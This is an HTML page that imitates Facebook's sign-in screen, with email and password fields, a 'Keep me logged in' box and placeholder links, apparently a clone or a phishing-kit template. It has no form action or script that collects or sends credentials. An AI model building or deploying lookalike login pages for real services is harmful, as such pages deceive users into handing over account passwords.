<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook - Sign in</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="page">
  <div class="header">
    <div class="block">
     <a href="/"><div class="logo"></div></a>
      <div class="h_sign"><a href="/"><div class="sign_up">Sign Up</div></a></div>
    </div>
  </div>
  <div class="content">
    <div class="login">
<div class="l_header">Facebook Login</div>
      <div class="l_content">
        <div class="login_form">
          <div class="form_row h_sign">
            <label for="email" class="login_form_label">Email or Phone:</label>
            <input type="text" class="input_text" id="email" name="email" value=""></div>
          <div class="form_row h_sign">
            <label for="pass" class="login_form_label">Password:</label>
            <input type="password" name="pass" id="pass" class="input_password"></div>
          <div class="persistent"><div class="uiInputLabel h_sign uiInputLabelLegacy">
            <input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox">
            <label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label>
          </div></div>
            <div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge"><input value="Log in" name="login" type="submit"></label></div>
            <div id="register_link">or <strong><a href="/" rel="nofollow">Sign up for Facebook</a></strong></div>
          <p class="reset_password form_row"><a href="/" target="">Forgot your password?</a></p>
        </div>
      </div>
    </div>
  </div>
</div>
</body>
</html>
